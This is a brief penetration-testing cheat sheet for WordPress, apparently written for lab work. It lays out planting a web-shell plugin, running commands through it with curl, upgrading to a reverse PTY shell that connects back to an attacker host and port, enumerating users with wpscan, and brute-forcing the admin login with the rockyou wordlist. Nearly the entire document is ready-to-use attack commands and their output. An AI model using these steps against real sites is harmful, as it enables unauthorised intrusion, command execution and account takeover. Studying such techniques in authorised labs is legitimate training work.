# Wordpress

## Evil plugin install

If you are wordpress admin. ( Upload wordpress-shell plugin that can be found under shells )

This location:

--> Plugins --> Installed Plugins --> Add new --> upload  ( Press Activate )

This command gives you now command execution

```sh
curl http://10.11.1.xxx/wp-content/plugins/shell/shell.php?cmd=id
```

Use shellupgrader.py to get a full PTY shell.

```sh
shellupgrader.py 'http://10.11.1.xxx/wp-content/plugins/shell/shell.php' 10.11.0.xxx 1337
 [+] LHOST = 10.11.0.xxx
 [+] LPORT = 1337
 [+] Shell listen
 www-data@hostname:/var/www/wp-content/plugins/shell$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reconnaissance

Enumerate users

```sh
wpscan --url 'http://10.11.1.234' --enumerate u
```

Bruteforce user account

```sh
wpscan --url 'http://10.11.1.xxx' --wordlist /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt --username admin
```